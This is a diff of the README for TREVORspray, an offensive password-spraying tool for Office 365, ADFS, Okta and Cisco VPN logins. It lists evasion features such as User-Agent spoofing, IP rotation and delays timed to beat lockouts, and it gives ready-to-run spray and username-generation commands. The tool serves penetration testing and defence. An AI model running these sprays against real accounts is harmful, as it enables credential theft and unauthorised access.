@@ -7,14 +7,21 @@ By [@thetechr0mancer](https://twitter.com/thetechr0mancer)
 
 ## Features
 - Threads, lots of threads
-- Supported modules:
+- Multiple modules
   - `msol` (Office 365)
   - `adfs` (Active Directory Federation Services)
   - `okta` (Okta SSO)
   - `anyconnect` (Cisco VPN)
-  - See below for how to create your own
+  - custom modules (easy to make!)
 - Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
-- O365 loot module automatically checks for MFA bypasses (disable with `--no-loot`)
+- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
+- Round-robin proxy through multiple IPs with `--ssh` or `--subnet`
+- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
+- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
+- Comprehensive logging
+- Optional `--delay`, `--jitter`, and `--lockout-delay` between requests to bypass lockout countermeasures
+- IPv6 support
+- O365 MFA bypass support (disable with `--no-loot`)
   - IMAP
   - SMTP
   - POP
@@ -24,14 +31,6 @@ By [@thetechr0mancer](https://twitter.com/thetechr0mancer)
   - UM (Exchange Unified Messaging)
   - AutoDiscover - Automatically retrieves OAB (Offline Address Book)
   - Azure Portal Access
-- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
-- Round-robin proxy through multiple IPs with `--ssh` or `--subnet`
-- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
-- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
-- Logs everything to `~/.trevorspray/trevorspray.log`
-- Saves valid usernames to `~/.trevorspray/valid_usernames.txt`
-- Optional `--delay`, `--jitter`, and `--lockout-delay` between request to bypass lockout countermeasures
-- IPv6 support
 
 ## Installation:
 ```
@@ -47,7 +46,7 @@ $ pip install -U git+https://github.com/blacklanternsecurity/trevorspray@trevors
 
 ## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)
 ```bash
-trevorspray.py --recon evilcorp.com
+trevorspray --recon evilcorp.com
 ...
     "token_endpoint": "https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token"
 ...
@@ -55,17 +54,17 @@ trevorspray.py --recon evilcorp.com
 
 ## Example: Spray against discovered "token_endpoint" URL
 ```bash
-trevorspray.py -u emails.txt -p 'Fall2021!' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
+trevorspray -u emails.txt -p 'Fall2021!' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
 ```
 
 ## Example: Spray with 5-second delay between requests
 ```bash
-trevorspray.py -u bob@evilcorp.com -p 'Fall2021!' --delay 5
+trevorspray -u bob@evilcorp.com -p 'Fall2021!' --delay 5
 ```
 
 ## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specified)
 ```bash
-trevorspray.py -u emails.txt -p 'Fall2021!' --ssh root@1.2.3.4 root@4.3.2.1
+trevorspray -u emails.txt -p 'Fall2021!' --ssh root@1.2.3.4 root@4.3.2.1
 ```
 
 ## Example: Find valid usernames without OSINT >:D
@@ -85,12 +84,12 @@ echo -n $ordered_letters | while read -n1 f; do
   done
 done | tee f.last.txt
 
-trevorspray.py -e f.last.txt -p 'Fall2021!'
+trevorspray -u f.last.txt -p 'Fall2021!'
 ```
 
 ## TREVORspray - Help:
 ```
-$ trevorspray.py --help
+$ trevorspray --help
 usage: trevorspray [-h] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-t THREADS]
                    [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl] [--timeout TIMEOUT]
                    [--random-useragent] [-m {okta,anyconnect,adfs,msol}] [-6] [--proxy PROXY] [-v]
